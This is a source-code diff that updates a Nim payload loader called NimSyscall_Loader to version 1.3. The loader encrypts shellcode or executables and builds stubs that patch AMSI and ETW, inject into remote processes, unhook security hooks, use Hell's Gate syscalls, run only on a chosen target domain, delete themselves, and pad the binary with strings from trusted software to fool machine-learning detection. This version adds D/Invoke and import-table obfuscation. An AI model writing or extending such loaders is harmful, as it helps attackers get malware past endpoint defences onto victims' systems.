@@ -43,7 +43,8 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.2                                             
+                                                                 v1.3                                            
+
 """
 
 echo banner
@@ -51,10 +52,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.2
+NimSyscall_Loader v 1.3
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size>]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -84,16 +85,17 @@ Options:
   --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
   --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
   --replace    Replace common nim IoC's in the loader like the string 'nim'
-  --sandbox Check1    Include Sandbox Checks of your choice into the loader:
-                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
-                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
-                      DiskSpace -> Only execute if c:\ disk space >= 200GB
-                      MemorySpace -> Only execute if more than 4GB RAM available
+  --sandbox value    Include Sandbox Checks of your choice into the loader:
+                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
+                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
+                     DiskSpace -> Only execute if c:\ disk space >= 200GB
+                     MemorySpace -> Only execute if more than 4GB RAM available
   --pump value    Pump the file with:
                   words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
-                  size -> just pump the size to avoid signatures for smaller files
+                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
   --domain targetdomain    Specify a domain for SandBox Evasion
   --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
+  --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
 """
 
 if (paramCount() == 0):
@@ -128,6 +130,7 @@ var
     noArgs: bool = false
     peinject: bool = false
     peload: bool = false
+    callobfs: bool = false
     hellsgate: bool = false
     selfdelete: bool = false
     remoteprocess: string = ""
@@ -139,7 +142,7 @@ var
     pumpfmt: string = ""
     pumpargs: seq[string]
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.2")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.3")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -239,6 +242,9 @@ if args["--domain"]:
 if args["--self-delete"]:
   selfdelete = true
 
+if args["--obfuscatefunctions"]:
+  callobfs = true
+
 var blob: string
 #Read file and if PE convert to shellcode before
 if (shellcode):
@@ -302,7 +308,7 @@ import osproc
 
 
 let AssemblyImports = """
-import winim/clr except `[]`
+from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
 let LoadAssemblyStub = """
@@ -360,7 +366,7 @@ let Cryptstub1 = """
 import winim/lean
 #from dynlib import LibHandle, loadLib
 # something seams to be still missing here
-#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, CreateFileA, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, GetFileSize, HeapAlloc, GetProcessHeap, ReadFile, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, GetCurrentProcess, GetCurrentProcessId, OpenProcess, PROCESS_ALL_ACCESS, FALSE, VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, VirtualProtect, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES, NtClose
+#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
 import dynlib
 import strformat
 from os import paramCount, paramStr
@@ -369,6 +375,7 @@ import base64
 import strutils
 import ptr_math
 import strenc
+import DInvoke
 
 var success: BOOL
 
@@ -546,14 +553,13 @@ proc genEnglishwords (nuofWords: int): string =
   proc pumpenglishwords (numberofWords: int): seq[string] =
 
     var englishdicts: seq[string]
-    var output: seq[string]
+    var output: seq[string]    
     var dictionary: string
     when system.hostOS == "windows":
         dictionary = "Dicts\\englishwords.txt"
     else:
         dictionary = "Dicts/englishwords.txt"
     for line in lines dictionary:
-
       englishdicts.add(line)
     for i in 1 .. numberofWords:
       output.add(sample(englishdicts))
@@ -572,7 +578,38 @@ var {rand2} = {rand1}
 
 """
 
-  return englishwordsstub
+proc genTrustedwords (nuofWords: int): string =
+
+
+  proc pumpTrustedwords (numberofWords: int): seq[string] =
+
+    var trusteddicts: seq[string]
+    var output: seq[string]    
+    var dictionary: string
+    when system.hostOS == "windows":
+        dictionary = "Dicts\\trustedStrings.txt"
+    else:
+        dictionary = "Dicts/trustedStrings.txt"
+    for line in lines dictionary:
+      trusteddicts.add(line)
+    for i in 1 .. numberofWords:
+      output.add(sample(trusteddicts))
+    return output
+
+  proc rndStr: string =
+    for _ in .. 10:
+      add(result, char(rand(int('a') .. int('z'))))
+    
+  var rand1: seq[string] = pumpTrustedwords(nuofWords)
+  var rand2: string = rndStr()
+
+  let trustedwordsstub = fmt"""
+
+var {rand2} = {rand1}
+
+"""
+
+  return trustedwordsstub
 
 var stub = Cryptstub1
 
@@ -582,13 +619,15 @@ if(pump):
     for m in pumpargs:
         if(m == "words"):
             stub.add(genEnglishwords(rand(4750..7800)))
-        if (m == "size"):
-            stub.add("ToDo")
+        if (m == "reputation"):
+            stub.add(genTrustedwords(rand(3500..6200)))
 
 if (selfdelete):
+    stub.add(DInvokeSelfDeleteStubs)
     stub.add(FileDeleteStub)
 
 if(sandbox):
+    stub.add(DInvokeSandBoxStub)
     for m in sandboxchecks:
         if(m == "Domain"):
             stub.add(DomainCheckStub)
@@ -607,6 +646,8 @@ if(gosleep):
 
 if(unhook):
     if(hellsgate):
+        stub.add(HellsgateDInvokeBaseStub)
+        stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(HellsgateStub)
         stub.add(HellsgateProtectDelegate)
@@ -614,6 +655,8 @@ if(unhook):
         stub.add(HellsgateNtCloseDelegate)
         stub.add(HellsgateUnhookStub)
     else:
+        stub.add(DInvokeBaseStub)
+        stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(GetSyscallStub)
         stub.add(NtProtectVirtualMemoryDelegate)
@@ -629,8 +672,12 @@ stub = stub & Cryptstub2 & Cryptstub3
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
 
+if (AMSI or ETW or peload or (localinject == false)):
+    stub.add(DInvokeLoadLibraryAGetProcAddress)
 
-if (hellsgate):  
+if (hellsgate):
+    if ("OpenProcess_HASH * = 3768626" in stub) == false:
+        stub.add(HellsgateDInvokeBaseStub)  
     stub.add(WinLeanGetCurrentProcStub)
     if ("https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html" in stub) == false:
         stub.add(HellsgateStub)
@@ -706,6 +753,9 @@ if (hellsgate):
             stub.add(LoadAssemblyStub)
             stub.add(LoadAssemblyStubArgs)
         csharp = false
+else:
+    if ("VirtualAllocEx_HASH * = 3748893108" in stub) == false:
+        stub.add(DInvokeBaseStub)
 if (peload):
     if ("PS_ATTR_UNION" in stub) == false:
         stub.add(GetSyscallStub)
@@ -852,7 +902,7 @@ else:
     basicCompileFlags.add("--app=console ")
 
 if (reflective):
-    basicCompileFlags.add("--app=gui --dynamicbase, --export-all-symbols ")
+    basicCompileFlags.add("--app=gui --passL:-Wl,--dynamicbase,--export-all-symbols ")
 
 if (hellsgate):
     echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
@@ -866,9 +916,39 @@ echo basicCompileFlags
 echo "\n\n"
 discard os.execShellCmd(basicCompileFlags)
 
+proc replaceList () =
+    var words: seq[string]
+    var output: seq[string]
+    var dictionary: string
+    when system.hostOS == "windows":
+        dictionary = "Dicts\\toReplace.txt"
+    else:
+        dictionary = "Dicts/toReplace.txt"
+    for line in lines dictionary:
+      words.add(line)
+    var length: int = len(words) - 1
+    for i in 0..length:
+        var wordLength: int = len(words[i])
+        var replacelength = wordLength - 1
+        #echo words[i]
+        #echo wordLength
+        var randstring: string = rndStr(replacelength)
+        echo fmt"[!] ---> replacing {words[i]} with {randstring} "
+        var command: string = fmt"nimgrep ""{words[i]}"""
+        command.add(fmt" --replace {randstring} {outfile}")
+        echo command  
+        discard exec_cmd_ex(command)
+
 if(replace):
-    var randstring: string = rndStr(2)
-    echo fmt"[!] ---> replacing nim with {randstring} "
-    discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
+    replaceList()
 let msg = fmt"[!] Encrypted file saved to {outfile}"
 echo "\n" & msg
+
+if (callobfs):
+    when system.hostOS == "windows":
+        echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
+        echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfile} cobf\config.ini")
+        echo "\r\n"
+        echo fmt"Obfuscated binary saved to: cobf\{outfile}"
+    else:
+        echo "Only usable from a Windows OS, sorry!"    
